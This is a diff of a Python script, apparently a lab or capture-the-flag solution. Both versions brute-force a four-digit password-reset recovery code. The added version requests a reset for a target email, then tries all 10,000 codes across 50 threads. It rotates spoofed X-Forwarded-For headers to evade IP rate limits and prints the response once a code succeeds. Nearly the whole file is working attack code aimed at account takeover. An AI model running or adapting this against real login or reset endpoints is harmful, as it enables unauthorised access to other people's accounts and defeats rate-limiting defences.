@@ -1,46 +1,63 @@
+#!/usr/bin/env python3
+
 import requests
-import re
-import time
-from random import randint
-from concurrent.futures import ThreadPoolExecutor
+import random
+import threading
 
-# Function to attempt a single recovery code
-def try_code(code):
-    global s, url  # Use the session and URL from the global scope
-    s.headers.update({
-        "X-Forwarded-For": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}",
-        "X-Forwarded-Host": f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}"
-    })
-
-    code_str = f"{code:04d}"
-    answer = s.post(url=url, data={"recovery_code": code_str, "s": 180})
-
-    res = re.search(r"Invalid or expired recovery code", answer.text)
-    if not res:
-        print(f"[+] Found valid recovery code: {code_str}")
-        return code_str
-    return None
+url = "<reset-password-url>"
+stop_flag = threading.Event()
+num_threads = 50
 
 
-# Initialize session and make the initial request
-s = requests.session()
-url = "<reset-pass-endpoint>"
-s.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
-r = s.post(url=url, data={"email": "<email>"})
+def brute_force_code(session, start, end):
+    for code in range(start, end):
+        code_str = f"{code:04d}"
+        try:
+            r = session.post(
+                url,
+                data={"recovery_code": code_str, "s": "180"},
+                headers={
+                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
+                },
+                allow_redirects=False,
+            )
+            if stop_flag.is_set():
+                return
+            elif r.status_code == 302:
+                stop_flag.set()
+                print("[-] Timeout reached. Try again.")
+                return
+            else:
+                if "<error for invalid code>" not in r.text:
+                    stop_flag.set()
+                    print(f"[+] Found the recovery code: {code_str}")
+                    print("[+] Printing the response: ")
+                    print(r.text)
+                    return
+        except Exception as e:
+            #print(e)
+            pass
 
 
-# Use ThreadPoolExecutor to test multiple codes concurrently
-with ThreadPoolExecutor(max_workers=6) as executor:
-    futures = {executor.submit(try_code, code): code for code in range(0, 10000)}
+def main():
+    session = requests.Session()
+    print("[+] Sending the password reset request.")
+    session.post(url, data={"email": "<email>"})
+    print("[+] Starting the code brute-force.")
+    code_range = 10000
+    step = code_range // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = start + step
+        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
-    for future in futures:
-        code = futures[future]
-        if code % 100 == 0:
-            print(f"[*] Trying code: {code:04d}")
 
-        result = future.result()
-        if result is not None:
-            print(f"[✓] Found valid recovery code: {result}")
-            break
+if __name__ == "__main__":
+    main()
 
-        time.sleep(0.2)
+
